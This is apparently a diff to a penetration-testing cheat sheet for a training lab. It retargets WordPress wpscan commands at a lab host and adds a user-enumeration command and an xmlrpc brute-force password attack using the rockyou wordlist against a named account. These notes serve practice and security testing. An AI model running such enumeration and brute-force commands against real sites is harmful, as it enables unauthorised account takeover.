@@ -5,10 +5,10 @@ wpscan --url $url -e ap
 wpscan --url $url -e vp     <- Vulnerable plugins
 wpscan --url $url -e cb     <- Config backups
 wpscan --url $url -t 500 -e p --plugins-detection aggressive
-curl -s http://metapress.htb/ | grep plugins
+curl -s http://trilocor.local/ | grep plugins
 
-wpscan --url $url -e u -t 500    <- Enumerate Users
-wpscan --url $url --password-attack xmlrpc -t 500 -U ilfreightwp -P ~/rockyou.txt
+wpscan --url http://trilocor.local/ -e u -t 500    <- Enumerate Users
+wpscan --url http://trilocor.local/ --password-attack xmlrpc -t 500 -U ilfreightwp -P ~/rockyou.txt
 ```
 
 ```bash
